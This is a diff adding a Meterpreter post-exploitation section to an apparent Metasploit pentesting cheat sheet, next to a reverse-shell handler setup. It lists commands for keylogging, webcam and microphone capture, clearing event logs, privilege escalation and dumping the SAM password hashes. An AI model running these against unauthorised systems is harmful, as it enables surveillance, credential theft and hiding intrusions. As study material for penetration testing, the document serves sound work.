@@ -382,3 +382,56 @@ Once a vulnerability has been successfully exploited, a session will be created.
 ### Use a handler to catch the shell 
     use exploit/multi/handler
     set payload linux/x86/meterpreter/reverse_tcp (or any of the above payloads)
+## Meterpreter (post)
+### Get pid of the meterpreter on the target:
+    getpid
+### See all the processes:
+    ps
+### Core commands:
+background: Backgrounds the current session <br>
+exit: Terminate the Meterpreter session <br>
+guid: Get the session GUID (Globally Unique Identifier) <br>
+help: Displays the help menu <br>
+info: Displays information about a Post module <br>
+irb: Opens an interactive Ruby shell on the current session <br>
+load: Loads one or more Meterpreter extensions <br>
+migrate: Allows you to migrate Meterpreter to another process <br>
+run: Executes a Meterpreter script or Post module <br>
+sessions: Quickly switch to another session <br>
+
+### Networking commands
+arp: Displays the host ARP (Address Resolution Protocol) cache <br>
+ifconfig: Displays network interfaces available on the target system <br>
+netstat: Displays the network connections <br>
+portfwd: Forwards a local port to a remote service <br>
+route: Allows you to view and modify the routing table <br>
+
+### System commands
+
+clearev: Clears the event logs <br>
+execute: Executes a command <br>
+getpid: Shows the current process identifier <br>
+getuid: Shows the user that Meterpreter is running as <br>
+kill: Terminates a process <br>
+pkill: Terminates processes by name <br>
+ps: Lists running processes <br>
+reboot: Reboots the remote computer <br>
+shell: Drops into a system command shell <br>
+shutdown: Shuts down the remote computer <br>
+sysinfo: Gets information about the remote system, such as OS <br>
+
+### Others Commands (these will be listed under different menu categories in the help menu)
+
+idletime: Returns the number of seconds the remote user has been idle <br>
+keyscan_dump: Dumps the keystroke buffer <br>
+keyscan_start: Starts capturing keystrokes <br>
+keyscan_stop: Stops capturing keystrokes <br>
+screenshare: Allows you to watch the remote user's desktop in real time <br>
+screenshot: Grabs a screenshot of the interactive desktop <br>
+record_mic: Records audio from the default microphone for X seconds <br>
+webcam_chat: Starts a video chat <br>
+webcam_list: Lists webcams <br>
+webcam_snap: Takes a snapshot from the specified webcam <br>
+webcam_stream: Plays a video stream from the specified webcam <br>
+getsystem: Attempts to elevate your privilege to that of local system <br>
+hashdump: Dumps the contents of the SAM database <br>
